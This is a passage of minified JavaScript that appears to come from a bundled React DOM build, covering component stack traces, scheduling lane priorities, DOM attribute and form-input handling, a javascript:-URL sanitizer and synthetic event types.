                }
            };
            a.DetermineComponentFrameRoot.displayName = "DetermineComponentFrameRoot";
            var n = Object.getOwnPropertyDescriptor(a.DetermineComponentFrameRoot, "name");
            n && n.configurable && Object.defineProperty(a.DetermineComponentFrameRoot, "name", {
                value: "DetermineComponentFrameRoot"
            });
            var u = a.DetermineComponentFrameRoot()
              , c = u[0]
              , r = u[1];
            if (c && r) {
                var h = c.split(`
`)
                  , T = r.split(`
`);
                for (n = a = 0; a < h.length && !h[a].includes("DetermineComponentFrameRoot"); )
                    a++;
                for (; n < T.length && !T[n].includes("DetermineComponentFrameRoot"); )
                    n++;
                if (a === h.length || n === T.length)
                    for (a = h.length - 1,
                    n = T.length - 1; 1 <= a && 0 <= n && h[a] !== T[n]; )
                        n--;
                for (; 1 <= a && 0 <= n; a--,
                n--)
                    if (h[a] !== T[n]) {
                        if (a !== 1 || n !== 1)
                            do
                                if (a--,
                                n--,
                                0 > n || h[a] !== T[n]) {
                                    var M = `
` + h[a].replace(" at new ", " at ");
                                    return e.displayName && M.includes("<anonymous>") && (M = M.replace("<anonymous>", e.displayName)),
                                    M
                                }
                            while (1 <= a && 0 <= n);
                        break
                    }
            }
        } finally {
            ot = !1,
            Error.prepareStackTrace = l
        }
        return (l = e ? e.displayName || e.name : "") ? qe(l) : ""
    }
    function Zl(e, t) {
        switch (e.tag) {
        case 26:
        case 27:
        case 5:
            return qe(e.type);
        case 16:
            return qe("Lazy");
        case 13:
            return e.child !== t && t !== null ? qe("Suspense Fallback") : qe("Suspense");
        case 19:
            return qe("SuspenseList");
        case 0:
        case 15:
            return Ql(e.type, !1);
        case 11:
            return Ql(e.type.render, !1);
        case 1:
            return Ql(e.type, !0);
        case 31:
            return qe("Activity");
        default:
            return ""
        }
    }
    function da(e) {
        try {
            var t = ""
              , l = null;
            do
                t += Zl(e, l),
                l = e,
                e = e.return;
            while (e);
            return t
        } catch (a) {
            return `
Error generating stack: ` + a.message + `
` + a.stack
        }
    }
    var J = Object.prototype.hasOwnProperty
      , fe = s.unstable_scheduleCallback
      , Ee = s.unstable_cancelCallback
      , gt = s.unstable_shouldYield
      , Wt = s.unstable_requestPaint
      , Ye = s.unstable_now
      , Qt = s.unstable_getCurrentPriorityLevel
      , ji = s.unstable_ImmediatePriority
      , ma = s.unstable_UserBlockingPriority
      , ha = s.unstable_NormalPriority
      , Rm = s.unstable_LowPriority
      , Ps = s.unstable_IdlePriority
      , _m = s.log
      , Um = s.unstable_setDisableYieldValue
      , tn = null
      , St = null;
    function yl(e) {
        if (typeof _m == "function" && Um(e),
        St && typeof St.setStrictMode == "function")
            try {
                St.setStrictMode(tn, e)
            } catch {}
    }
    var bt = Math.clz32 ? Math.clz32 : Bm
      , Hm = Math.log
      , Lm = Math.LN2;
    function Bm(e) {
        return e >>>= 0,
        e === 0 ? 32 : 31 - (Hm(e) / Lm | 0) | 0
    }
    var tu = 256
      , lu = 262144
      , au = 4194304;
    function Vl(e) {
        var t = e & 42;
        if (t !== 0)
            return t;
        switch (e & -e) {
        case 1:
            return 1;
        case 2:
            return 2;
        case 4:
            return 4;
        case 8:
            return 8;
        case 16:
            return 16;
        case 32:
            return 32;
        case 64:
            return 64;
        case 128:
            return 128;
        case 256:
        case 512:
        case 1024:
        case 2048:
        case 4096:
        case 8192:
        case 16384:
        case 32768:
        case 65536:
        case 131072:
            return e & 261888;
        case 262144:
        case 524288:
        case 1048576:
        case 2097152:
            return e & 3932160;
        case 4194304:
        case 8388608:
        case 16777216:
        case 33554432:
            return e & 62914560;
        case 67108864:
            return 67108864;
        case 134217728:
            return 134217728;
        case 268435456:
            return 268435456;
        case 536870912:
            return 536870912;
        case 1073741824:
            return 0;
        default:
            return e
        }
    }
    function nu(e, t, l) {
        var a = e.pendingLanes;
        if (a === 0)
            return 0;
        var n = 0
          , u = e.suspendedLanes
          , c = e.pingedLanes;
        e = e.warmLanes;
        var r = a & 134217727;
        return r !== 0 ? (a = r & ~u,
        a !== 0 ? n = Vl(a) : (c &= r,
        c !== 0 ? n = Vl(c) : l || (l = r & ~e,
        l !== 0 && (n = Vl(l))))) : (r = a & ~u,
        r !== 0 ? n = Vl(r) : c !== 0 ? n = Vl(c) : l || (l = a & ~e,
        l !== 0 && (n = Vl(l)))),
        n === 0 ? 0 : t !== 0 && t !== n && (t & u) === 0 && (u = n & -n,
        l = t & -t,
        u >= l || u === 32 && (l & 4194048) !== 0) ? t : n
    }
    function ln(e, t) {
        return (e.pendingLanes & ~(e.suspendedLanes & ~e.pingedLanes) & t) === 0
    }
    function qm(e, t) {
        switch (e) {
        case 1:
        case 2:
        case 4:
        case 8:
        case 64:
            return t + 250;
        case 16:
        case 32:
        case 128:
        case 256:
        case 512:
        case 1024:
        case 2048:
        case 4096:
        case 8192:
        case 16384:
        case 32768:
        case 65536:
        case 131072:
        case 262144:
        case 524288:
        case 1048576:
        case 2097152:
            return t + 5e3;
        case 4194304:
        case 8388608:
        case 16777216:
        case 33554432:
            return -1;
        case 67108864:
        case 134217728:
        case 268435456:
        case 536870912:
        case 1073741824:
            return -1;
        default:
            return -1
        }
    }
    function eo() {
        var e = au;
        return au <<= 1,
        (au & 62914560) === 0 && (au = 4194304),
        e
    }
    function Ei(e) {
        for (var t = [], l = 0; 31 > l; l++)
            t.push(e);
        return t
    }
    function an(e, t) {
        e.pendingLanes |= t,
        t !== 268435456 && (e.suspendedLanes = 0,
        e.pingedLanes = 0,
        e.warmLanes = 0)
    }
    function Ym(e, t, l, a, n, u) {
        var c = e.pendingLanes;
        e.pendingLanes = l,
        e.suspendedLanes = 0,
        e.pingedLanes = 0,
        e.warmLanes = 0,
        e.expiredLanes &= l,
        e.entangledLanes &= l,
        e.errorRecoveryDisabledLanes &= l,
        e.shellSuspendCounter = 0;
        var r = e.entanglements
          , h = e.expirationTimes
          , T = e.hiddenUpdates;
        for (l = c & ~l; 0 < l; ) {
            var M = 31 - bt(l)
              , U = 1 << M;
            r[M] = 0,
            h[M] = -1;
            var A = T[M];
            if (A !== null)
                for (T[M] = null,
                M = 0; M < A.length; M++) {
                    var C = A[M];
                    C !== null && (C.lane &= -536870913)
                }
            l &= ~U
        }
        a !== 0 && to(e, a, 0),
        u !== 0 && n === 0 && e.tag !== 0 && (e.suspendedLanes |= u & ~(c & ~t))
    }
    function to(e, t, l) {
        e.pendingLanes |= t,
        e.suspendedLanes &= ~t;
        var a = 31 - bt(t);
        e.entangledLanes |= t,
        e.entanglements[a] = e.entanglements[a] | 1073741824 | l & 261930
    }
    function lo(e, t) {
        var l = e.entangledLanes |= t;
        for (e = e.entanglements; l; ) {
            var a = 31 - bt(l)
              , n = 1 << a;
            n & t | e[a] & t && (e[a] |= t),
            l &= ~n
        }
    }
    function ao(e, t) {
        var l = t & -t;
        return l = (l & 42) !== 0 ? 1 : Ti(l),
        (l & (e.suspendedLanes | t)) !== 0 ? 0 : l
    }
    function Ti(e) {
        switch (e) {
        case 2:
            e = 1;
            break;
        case 8:
            e = 4;
            break;
        case 32:
            e = 16;
            break;
        case 256:
        case 512:
        case 1024:
        case 2048:
        case 4096:
        case 8192:
        case 16384:
        case 32768:
        case 65536:
        case 131072:
        case 262144:
        case 524288:
        case 1048576:
        case 2097152:
        case 4194304:
        case 8388608:
        case 16777216:
        case 33554432:
            e = 128;
            break;
        case 268435456:
            e = 134217728;
            break;
        default:
            e = 0
        }
        return e
    }
    function Ai(e) {
        return e &= -e,
        2 < e ? 8 < e ? (e & 134217727) !== 0 ? 32 : 268435456 : 8 : 2
    }
    function no() {
        var e = B.p;
        return e !== 0 ? e : (e = window.event,
        e === void 0 ? 32 : Vd(e.type))
    }
    function uo(e, t) {
        var l = B.p;
        try {
            return B.p = e,
            t()
        } finally {
            B.p = l
        }
    }
    var gl = Math.random().toString(36).slice(2)
      , tt = "__reactFiber$" + gl
      , ft = "__reactProps$" + gl
      , pa = "__reactContainer$" + gl
      , zi = "__reactEvents$" + gl
      , wm = "__reactListeners$" + gl
      , Gm = "__reactHandles$" + gl
      , io = "__reactResources$" + gl
      , nn = "__reactMarker$" + gl;
    function Di(e) {
        delete e[tt],
        delete e[ft],
        delete e[zi],
        delete e[wm],
        delete e[Gm]
    }
    function va(e) {
        var t = e[tt];
        if (t)
            return t;
        for (var l = e.parentNode; l; ) {
            if (t = l[pa] || l[tt]) {
                if (l = t.alternate,
                t.child !== null || l !== null && l.child !== null)
                    for (e = Cd(e); e !== null; ) {
                        if (l = e[tt])
                            return l;
                        e = Cd(e)
                    }
                return t
            }
            e = l,
            l = e.parentNode
        }
        return null
    }
    function ya(e) {
        if (e = e[tt] || e[pa]) {
            var t = e.tag;
            if (t === 5 || t === 6 || t === 13 || t === 31 || t === 26 || t === 27 || t === 3)
                return e
        }
        return null
    }
    function un(e) {
        var t = e.tag;
        if (t === 5 || t === 26 || t === 27 || t === 6)
            return e.stateNode;
        throw Error(o(33))
    }
    function ga(e) {
        var t = e[io];
        return t || (t = e[io] = {
            hoistableStyles: new Map,
            hoistableScripts: new Map
        }),
        t
    }
    function Pe(e) {
        e[nn] = !0
    }
    var co = new Set
      , so = {};
    function Kl(e, t) {
        Sa(e, t),
        Sa(e + "Capture", t)
    }
    function Sa(e, t) {
        for (so[e] = t,
        e = 0; e < t.length; e++)
            co.add(t[e])
    }
    var Xm = RegExp("^[:A-Z_a-z\\u00C0-\\u00D6\\u00D8-\\u00F6\\u00F8-\\u02FF\\u0370-\\u037D\\u037F-\\u1FFF\\u200C-\\u200D\\u2070-\\u218F\\u2C00-\\u2FEF\\u3001-\\uD7FF\\uF900-\\uFDCF\\uFDF0-\\uFFFD][:A-Z_a-z\\u00C0-\\u00D6\\u00D8-\\u00F6\\u00F8-\\u02FF\\u0370-\\u037D\\u037F-\\u1FFF\\u200C-\\u200D\\u2070-\\u218F\\u2C00-\\u2FEF\\u3001-\\uD7FF\\uF900-\\uFDCF\\uFDF0-\\uFFFD\\-.0-9\\u00B7\\u0300-\\u036F\\u203F-\\u2040]*$")
      , oo = {}
      , ro = {};
    function Qm(e) {
        return J.call(ro, e) ? !0 : J.call(oo, e) ? !1 : Xm.test(e) ? ro[e] = !0 : (oo[e] = !0,
        !1)
    }
    function uu(e, t, l) {
        if (Qm(t))
            if (l === null)
                e.removeAttribute(t);
            else {
                switch (typeof l) {
                case "undefined":
                case "function":
                case "symbol":
                    e.removeAttribute(t);
                    return;
                case "boolean":
                    var a = t.toLowerCase().slice(0, 5);
                    if (a !== "data-" && a !== "aria-") {
                        e.removeAttribute(t);
                        return
                    }
                }
                e.setAttribute(t, "" + l)
            }
    }
    function iu(e, t, l) {
        if (l === null)
            e.removeAttribute(t);
        else {
            switch (typeof l) {
            case "undefined":
            case "function":
            case "symbol":
            case "boolean":
                e.removeAttribute(t);
                return
            }
            e.setAttribute(t, "" + l)
        }
    }
    function Ft(e, t, l, a) {
        if (a === null)
            e.removeAttribute(l);
        else {
            switch (typeof a) {
            case "undefined":
            case "function":
            case "symbol":
            case "boolean":
                e.removeAttribute(l);
                return
            }
            e.setAttributeNS(t, l, "" + a)
        }
    }
    function Dt(e) {
        switch (typeof e) {
        case "bigint":
        case "boolean":
        case "number":
        case "string":
        case "undefined":
            return e;
        case "object":
            return e;
        default:
            return ""
        }
    }
    function fo(e) {
        var t = e.type;
        return (e = e.nodeName) && e.toLowerCase() === "input" && (t === "checkbox" || t === "radio")
    }
    function Zm(e, t, l) {
        var a = Object.getOwnPropertyDescriptor(e.constructor.prototype, t);
        if (!e.hasOwnProperty(t) && typeof a < "u" && typeof a.get == "function" && typeof a.set == "function") {
            var n = a.get
              , u = a.set;
            return Object.defineProperty(e, t, {
                configurable: !0,
                get: function() {
                    return n.call(this)
                },
                set: function(c) {
                    l = "" + c,
                    u.call(this, c)
                }
            }),
            Object.defineProperty(e, t, {
                enumerable: a.enumerable
            }),
            {
                getValue: function() {
                    return l
                },
                setValue: function(c) {
                    l = "" + c
                },
                stopTracking: function() {
                    e._valueTracker = null,
                    delete e[t]
                }
            }
        }
    }
    function Ci(e) {
        if (!e._valueTracker) {
            var t = fo(e) ? "checked" : "value";
            e._valueTracker = Zm(e, t, "" + e[t])
        }
    }
    function mo(e) {
        if (!e)
            return !1;
        var t = e._valueTracker;
        if (!t)
            return !0;
        var l = t.getValue()
          , a = "";
        return e && (a = fo(e) ? e.checked ? "true" : "false" : e.value),
        e = a,
        e !== l ? (t.setValue(e),
        !0) : !1
    }
    function cu(e) {
        if (e = e || (typeof document < "u" ? document : void 0),
        typeof e > "u")
            return null;
        try {
            return e.activeElement || e.body
        } catch {
            return e.body
        }
    }
    var Vm = /[\n"\\]/g;
    function Ct(e) {
        return e.replace(Vm, function(t) {
            return "\\" + t.charCodeAt(0).toString(16) + " "
        })
    }
    function Oi(e, t, l, a, n, u, c, r) {
        e.name = "",
        c != null && typeof c != "function" && typeof c != "symbol" && typeof c != "boolean" ? e.type = c : e.removeAttribute("type"),
        t != null ? c === "number" ? (t === 0 && e.value === "" || e.value != t) && (e.value = "" + Dt(t)) : e.value !== "" + Dt(t) && (e.value = "" + Dt(t)) : c !== "submit" && c !== "reset" || e.removeAttribute("value"),
        t != null ? Mi(e, c, Dt(t)) : l != null ? Mi(e, c, Dt(l)) : a != null && e.removeAttribute("value"),
        n == null && u != null && (e.defaultChecked = !!u),
        n != null && (e.checked = n && typeof n != "function" && typeof n != "symbol"),
        r != null && typeof r != "function" && typeof r != "symbol" && typeof r != "boolean" ? e.name = "" + Dt(r) : e.removeAttribute("name")
    }
    function ho(e, t, l, a, n, u, c, r) {
        if (u != null && typeof u != "function" && typeof u != "symbol" && typeof u != "boolean" && (e.type = u),
        t != null || l != null) {
            if (!(u !== "submit" && u !== "reset" || t != null)) {
                Ci(e);
                return
            }
            l = l != null ? "" + Dt(l) : "",
            t = t != null ? "" + Dt(t) : l,
            r || t === e.value || (e.value = t),
            e.defaultValue = t
        }
        a = a ?? n,
        a = typeof a != "function" && typeof a != "symbol" && !!a,
        e.checked = r ? e.checked : !!a,
        e.defaultChecked = !!a,
        c != null && typeof c != "function" && typeof c != "symbol" && typeof c != "boolean" && (e.name = c),
        Ci(e)
    }
    function Mi(e, t, l) {
        t === "number" && cu(e.ownerDocument) === e || e.defaultValue === "" + l || (e.defaultValue = "" + l)
    }
    function ba(e, t, l, a) {
        if (e = e.options,
        t) {
            t = {};
            for (var n = 0; n < l.length; n++)
                t["$" + l[n]] = !0;
            for (l = 0; l < e.length; l++)
                n = t.hasOwnProperty("$" + e[l].value),
                e[l].selected !== n && (e[l].selected = n),
                n && a && (e[l].defaultSelected = !0)
        } else {
            for (l = "" + Dt(l),
            t = null,
            n = 0; n < e.length; n++) {
                if (e[n].value === l) {
                    e[n].selected = !0,
                    a && (e[n].defaultSelected = !0);
                    return
                }
                t !== null || e[n].disabled || (t = e[n])
            }
            t !== null && (t.selected = !0)
        }
    }
    function po(e, t, l) {
        if (t != null && (t = "" + Dt(t),
        t !== e.value && (e.value = t),
        l == null)) {
            e.defaultValue !== t && (e.defaultValue = t);
            return
        }
        e.defaultValue = l != null ? "" + Dt(l) : ""
    }
    function vo(e, t, l, a) {
        if (t == null) {
            if (a != null) {
                if (l != null)
                    throw Error(o(92));
                if (Qe(a)) {
                    if (1 < a.length)
                        throw Error(o(93));
                    a = a[0]
                }
                l = a
            }
            l == null && (l = ""),
            t = l
        }
        l = Dt(t),
        e.defaultValue = l,
        a = e.textContent,
        a === l && a !== "" && a !== null && (e.value = a),
        Ci(e)
    }
    function xa(e, t) {
        if (t) {
            var l = e.firstChild;
            if (l && l === e.lastChild && l.nodeType === 3) {
                l.nodeValue = t;
                return
            }
        }
        e.textContent = t
    }
    var Km = new Set("animationIterationCount aspectRatio borderImageOutset borderImageSlice borderImageWidth boxFlex boxFlexGroup boxOrdinalGroup columnCount columns flex flexGrow flexPositive flexShrink flexNegative flexOrder gridArea gridRow gridRowEnd gridRowSpan gridRowStart gridColumn gridColumnEnd gridColumnSpan gridColumnStart fontWeight lineClamp lineHeight opacity order orphans scale tabSize widows zIndex zoom fillOpacity floodOpacity stopOpacity strokeDasharray strokeDashoffset strokeMiterlimit strokeOpacity strokeWidth MozAnimationIterationCount MozBoxFlex MozBoxFlexGroup MozLineClamp msAnimationIterationCount msFlex msZoom msFlexGrow msFlexNegative msFlexOrder msFlexPositive msFlexShrink msGridColumn msGridColumnSpan msGridRow msGridRowSpan WebkitAnimationIterationCount WebkitBoxFlex WebKitBoxFlexGroup WebkitBoxOrdinalGroup WebkitColumnCount WebkitColumns WebkitFlex WebkitFlexGrow WebkitFlexPositive WebkitFlexShrink WebkitLineClamp".split(" "));
    function yo(e, t, l) {
        var a = t.indexOf("--") === 0;
        l == null || typeof l == "boolean" || l === "" ? a ? e.setProperty(t, "") : t === "float" ? e.cssFloat = "" : e[t] = "" : a ? e.setProperty(t, l) : typeof l != "number" || l === 0 || Km.has(t) ? t === "float" ? e.cssFloat = l : e[t] = ("" + l).trim() : e[t] = l + "px"
    }
    function go(e, t, l) {
        if (t != null && typeof t != "object")
            throw Error(o(62));
        if (e = e.style,
        l != null) {
            for (var a in l)
                !l.hasOwnProperty(a) || t != null && t.hasOwnProperty(a) || (a.indexOf("--") === 0 ? e.setProperty(a, "") : a === "float" ? e.cssFloat = "" : e[a] = "");
            for (var n in t)
                a = t[n],
                t.hasOwnProperty(n) && l[n] !== a && yo(e, n, a)
        } else
            for (var u in t)
                t.hasOwnProperty(u) && yo(e, u, t[u])
    }
    function Ri(e) {
        if (e.indexOf("-") === -1)
            return !1;
        switch (e) {
        case "annotation-xml":
        case "color-profile":
        case "font-face":
        case "font-face-src":
        case "font-face-uri":
        case "font-face-format":
        case "font-face-name":
        case "missing-glyph":
            return !1;
        default:
            return !0
        }
    }
    var Jm = new Map([["acceptCharset", "accept-charset"], ["htmlFor", "for"], ["httpEquiv", "http-equiv"], ["crossOrigin", "crossorigin"], ["accentHeight", "accent-height"], ["alignmentBaseline", "alignment-baseline"], ["arabicForm", "arabic-form"], ["baselineShift", "baseline-shift"], ["capHeight", "cap-height"], ["clipPath", "clip-path"], ["clipRule", "clip-rule"], ["colorInterpolation", "color-interpolation"], ["colorInterpolationFilters", "color-interpolation-filters"], ["colorProfile", "color-profile"], ["colorRendering", "color-rendering"], ["dominantBaseline", "dominant-baseline"], ["enableBackground", "enable-background"], ["fillOpacity", "fill-opacity"], ["fillRule", "fill-rule"], ["floodColor", "flood-color"], ["floodOpacity", "flood-opacity"], ["fontFamily", "font-family"], ["fontSize", "font-size"], ["fontSizeAdjust", "font-size-adjust"], ["fontStretch", "font-stretch"], ["fontStyle", "font-style"], ["fontVariant", "font-variant"], ["fontWeight", "font-weight"], ["glyphName", "glyph-name"], ["glyphOrientationHorizontal", "glyph-orientation-horizontal"], ["glyphOrientationVertical", "glyph-orientation-vertical"], ["horizAdvX", "horiz-adv-x"], ["horizOriginX", "horiz-origin-x"], ["imageRendering", "image-rendering"], ["letterSpacing", "letter-spacing"], ["lightingColor", "lighting-color"], ["markerEnd", "marker-end"], ["markerMid", "marker-mid"], ["markerStart", "marker-start"], ["overlinePosition", "overline-position"], ["overlineThickness", "overline-thickness"], ["paintOrder", "paint-order"], ["panose-1", "panose-1"], ["pointerEvents", "pointer-events"], ["renderingIntent", "rendering-intent"], ["shapeRendering", "shape-rendering"], ["stopColor", "stop-color"], ["stopOpacity", "stop-opacity"], ["strikethroughPosition", "strikethrough-position"], ["strikethroughThickness", "strikethrough-thickness"], ["strokeDasharray", "stroke-dasharray"], ["strokeDashoffset", "stroke-dashoffset"], ["strokeLinecap", "stroke-linecap"], ["strokeLinejoin", "stroke-linejoin"], ["strokeMiterlimit", "stroke-miterlimit"], ["strokeOpacity", "stroke-opacity"], ["strokeWidth", "stroke-width"], ["textAnchor", "text-anchor"], ["textDecoration", "text-decoration"], ["textRendering", "text-rendering"], ["transformOrigin", "transform-origin"], ["underlinePosition", "underline-position"], ["underlineThickness", "underline-thickness"], ["unicodeBidi", "unicode-bidi"], ["unicodeRange", "unicode-range"], ["unitsPerEm", "units-per-em"], ["vAlphabetic", "v-alphabetic"], ["vHanging", "v-hanging"], ["vIdeographic", "v-ideographic"], ["vMathematical", "v-mathematical"], ["vectorEffect", "vector-effect"], ["vertAdvY", "vert-adv-y"], ["vertOriginX", "vert-origin-x"], ["vertOriginY", "vert-origin-y"], ["wordSpacing", "word-spacing"], ["writingMode", "writing-mode"], ["xmlnsXlink", "xmlns:xlink"], ["xHeight", "x-height"]])
      , km = /^[\u0000-\u001F ]*j[\r\n\t]*a[\r\n\t]*v[\r\n\t]*a[\r\n\t]*s[\r\n\t]*c[\r\n\t]*r[\r\n\t]*i[\r\n\t]*p[\r\n\t]*t[\r\n\t]*:/i;
    function su(e) {
        return km.test("" + e) ? "javascript:throw new Error('React has blocked a javascript: URL as a security precaution.')" : e
    }
    function It() {}
    var _i = null;
    function Ui(e) {
        return e = e.target || e.srcElement || window,
        e.correspondingUseElement && (e = e.correspondingUseElement),
        e.nodeType === 3 ? e.parentNode : e
    }
    var Na = null
      , ja = null;
    function So(e) {
        var t = ya(e);
        if (t && (e = t.stateNode)) {
            var l = e[ft] || null;
            e: switch (e = t.stateNode,
            t.type) {
            case "input":
                if (Oi(e, l.value, l.defaultValue, l.defaultValue, l.checked, l.defaultChecked, l.type, l.name),
                t = l.name,
                l.type === "radio" && t != null) {
                    for (l = e; l.parentNode; )
                        l = l.parentNode;
                    for (l = l.querySelectorAll('input[name="' + Ct("" + t) + '"][type="radio"]'),
                    t = 0; t < l.length; t++) {
                        var a = l[t];
                        if (a !== e && a.form === e.form) {
                            var n = a[ft] || null;
                            if (!n)
                                throw Error(o(90));
                            Oi(a, n.value, n.defaultValue, n.defaultValue, n.checked, n.defaultChecked, n.type, n.name)
                        }
                    }
                    for (t = 0; t < l.length; t++)
                        a = l[t],
                        a.form === e.form && mo(a)
                }
                break e;
            case "textarea":
                po(e, l.value, l.defaultValue);
                break e;
            case "select":
                t = l.value,
                t != null && ba(e, !!l.multiple, t, !1)
            }
        }
    }
    var Hi = !1;
    function bo(e, t, l) {
        if (Hi)
            return e(t, l);
        Hi = !0;
        try {
            var a = e(t);
            return a
        } finally {
            if (Hi = !1,
            (Na !== null || ja !== null) && ($u(),
            Na && (t = Na,
            e = ja,
            ja = Na = null,
            So(t),
            e)))
                for (t = 0; t < e.length; t++)
                    So(e[t])
        }
    }
    function cn(e, t) {
        var l = e.stateNode;
        if (l === null)
            return null;
        var a = l[ft] || null;
        if (a === null)
            return null;
        l = a[t];
        e: switch (t) {
        case "onClick":
        case "onClickCapture":
        case "onDoubleClick":
        case "onDoubleClickCapture":
        case "onMouseDown":
        case "onMouseDownCapture":
        case "onMouseMove":
        case "onMouseMoveCapture":
        case "onMouseUp":
        case "onMouseUpCapture":
        case "onMouseEnter":
            (a = !a.disabled) || (e = e.type,
            a = !(e === "button" || e === "input" || e === "select" || e === "textarea")),
            e = !a;
            break e;
        default:
            e = !1
        }
        if (e)
            return null;
        if (l && typeof l != "function")
            throw Error(o(231, t, typeof l));
        return l
    }
    var Pt = !(typeof window > "u" || typeof window.document > "u" || typeof window.document.createElement > "u")
      , Li = !1;
    if (Pt)
        try {
            var sn = {};
            Object.defineProperty(sn, "passive", {
                get: function() {
                    Li = !0
                }
            }),
            window.addEventListener("test", sn, sn),
            window.removeEventListener("test", sn, sn)
        } catch {
            Li = !1
        }
    var Sl = null
      , Bi = null
      , ou = null;
    function xo() {
        if (ou)
            return ou;
        var e, t = Bi, l = t.length, a, n = "value" in Sl ? Sl.value : Sl.textContent, u = n.length;
        for (e = 0; e < l && t[e] === n[e]; e++)
            ;
        var c = l - e;
        for (a = 1; a <= c && t[l - a] === n[u - a]; a++)
            ;
        return ou = n.slice(e, 1 < a ? 1 - a : void 0)
    }
    function ru(e) {
        var t = e.keyCode;
        return "charCode" in e ? (e = e.charCode,
        e === 0 && t === 13 && (e = 13)) : e = t,
        e === 10 && (e = 13),
        32 <= e || e === 13 ? e : 0
    }
    function fu() {
        return !0
    }
    function No() {
        return !1
    }
    function dt(e) {
        function t(l, a, n, u, c) {
            this._reactName = l,
            this._targetInst = n,
            this.type = a,
            this.nativeEvent = u,
            this.target = c,
            this.currentTarget = null;
            for (var r in e)
                e.hasOwnProperty(r) && (l = e[r],
                this[r] = l ? l(u) : u[r]);
            return this.isDefaultPrevented = (u.defaultPrevented != null ? u.defaultPrevented : u.returnValue === !1) ? fu : No,
            this.isPropagationStopped = No,
            this
        }
        return j(t.prototype, {
            preventDefault: function() {
                this.defaultPrevented = !0;
                var l = this.nativeEvent;
                l && (l.preventDefault ? l.preventDefault() : typeof l.returnValue != "unknown" && (l.returnValue = !1),
                this.isDefaultPrevented = fu)
            },
            stopPropagation: function() {
                var l = this.nativeEvent;
                l && (l.stopPropagation ? l.stopPropagation() : typeof l.cancelBubble != "unknown" && (l.cancelBubble = !0),
                this.isPropagationStopped = fu)
            },
            persist: function() {},
            isPersistent: fu
        }),
        t
    }
    var Jl = {
        eventPhase: 0,
        bubbles: 0,
        cancelable: 0,
        timeStamp: function(e) {
            return e.timeStamp || Date.now()
        },
        defaultPrevented: 0,
        isTrusted: 0
    }, du = dt(Jl), on = j({}, Jl, {
        view: 0,
        detail: 0
    }), $m = dt(on), qi, Yi, rn, mu = j({}, on, {
        screenX: 0,
        screenY: 0,
        clientX: 0,
        clientY: 0,
        pageX: 0,
        pageY: 0,
        ctrlKey: 0,
        shiftKey: 0,
        altKey: 0,
        metaKey: 0,
        getModifierState: Gi,
        button: 0,
        buttons: 0,
        relatedTarget: function(e) {
            return e.relatedTarget === void 0 ? e.fromElement === e.srcElement ? e.toElement : e.fromElement : e.relatedTarget
        },
        movementX: function(e) {
            return "movementX" in e ? e.movementX : (e !== rn && (rn && e.type === "mousemove" ? (qi = e.screenX - rn.screenX,
            Yi = e.screenY - rn.screenY) : Yi = qi = 0,
            rn = e),
            qi)
        },
        movementY: function(e) {
            return "movementY" in e ? e.movementY : Yi
        }
    }), jo = dt(mu), Wm = j({}, mu, {
        dataTransfer: 0
    }), Fm = dt(Wm), Im = j({}, on, {
        relatedTarget: 0
    }), wi = dt(Im), Pm = j({}, Jl, {
        animationName: 0,
        elapsedTime: 0,
        pseudoElement: 0
    }), eh = dt(Pm), th = j({}, Jl, {
        clipboardData: function(e) {
            return "clipboardData" in e ? e.clipboardData : window.clipboardData
        }
    }), lh = dt(th), ah = j({}, Jl, {
        data: 0
    }), Eo = dt(ah), nh = {
        Esc: "Escape",
        Spacebar: " ",
        Left: "ArrowLeft",
        Up: "ArrowUp",
        Right: "ArrowRight",
        Down: "ArrowDown",
        Del: "Delete",
        Win: "OS",
        Menu: "ContextMenu",
        Apps: "ContextMenu",
        Scroll: "ScrollLock",
        MozPrintableKey: "Unidentified"
    }, uh = {
        8: "Backspace",
        9: "Tab",
        12: "Clear",
        13: "Enter",
        16: "Shift",
        17: "Control",
        18: "Alt",
        19: "Pause",
        20: "CapsLock",
        27: "Escape",
        32: " ",
        33: "PageUp",
        34: "PageDown",
        35: "End",
        36: "Home",
        37: "ArrowLeft",
        38: "ArrowUp",
        39: "ArrowRight",
        40: "ArrowDown",
        45: "Insert",
        46: "Delete",
        112: "F1",
        113: "F2",
        114: "F3",
        115: "F4",
        116: "F5",
        117: "F6",
        118: "F7",
        119: "F8",
        120: "F9",
        121: "F10",
        122: "F11",
        123: "F12",
        144: "NumLock",
        145: "ScrollLock",
        224: "Meta"
    }, ih = {
        Alt: "altKey",
        Control: "ctrlKey",
        Meta: "metaKey",
        Shift: "shiftKey"
    };
    function ch(e) {
        var t = this.nativeEvent;
        return t.getModifierState ? t.getModifierState(e) : (e = ih[e]) ? !!t[e] : !1
    }
    function Gi() {
        return ch
    }
    var sh = j({}, on, {
        key: function(e) {
            if (e.key) {
                var t = nh[e.key] || e.key;
                if (t !== "Unidentified")
                    return t
            }
            return e.type === "keypress" ? (e = ru(e),
            e === 13 ? "Enter" : String.fromCharCode(e)) : e.type === "keydown" || e.type === "keyup" ? uh[e.keyCode] || "Unidentified" : ""
        },
        code: 0,
        location: 0,
        ctrlKey: 0,
        shiftKey: 0,
        altKey: 0,
        metaKey: 0,
        repeat: 0,
        locale: 0,
        getModifierState: Gi,
        charCode: function(e) {
            return e.type === "keypress" ? ru(e) : 0
        },
        keyCode: function(e) {
            return e.type === "keydown" || e.type === "keyup" ? e.keyCode : 0
        },
        which: function(e) {
            return e.type === "keypress" ? ru(e) : e.type === "keydown" || e.type === "keyup" ? e.keyCode : 0
        }
    })
      , oh = dt(sh)
      , rh = j({}, mu, {
        pointerId: 0,
        width: 0,
        height: 0,
        pressure: 0,
        tangentialPressure: 0,
        tiltX: 0,
        tiltY: 0,
        twist: 0,
        pointerType: 0,
        isPrimary: 0
    })
      , To = dt(rh)
      , fh = j({}, on, {
        touches: 0,
        targetTouches: 0,
        changedTouches: 0,
        altKey: 0,
        metaKey: 0,
        ctrlKey: 0,
        shiftKey: 0,
        getModifierState: Gi
    })
      , dh = dt(fh)
      , mh = j({}, Jl, {
        propertyName: 0,
        elapsedTime: 0,
        pseudoElement: 0
    })
      , hh = dt(mh)
      , ph = j({}, mu, {
        deltaX: function(e) {
            return "deltaX" in e ? e.deltaX : "wheelDeltaX" in e ? -e.wheelDeltaX : 0
        },
        deltaY: function(e) {
            return "deltaY" in e ? e.deltaY : "wheelDeltaY" in e ? -e.wheelDeltaY : "wheelDelta" in e ? -e.wheelDelta : 0
        },
        deltaZ: 0,
        deltaMode: 0
    })
      , vh = dt(ph)
      , yh = j({}, Jl, {
        newState: 0,
        oldState: 0
    })
      , gh = dt(yh)
      , Sh = [9, 13, 27, 32]
      , Xi = Pt && "CompositionEvent" in window
      , fn = null;
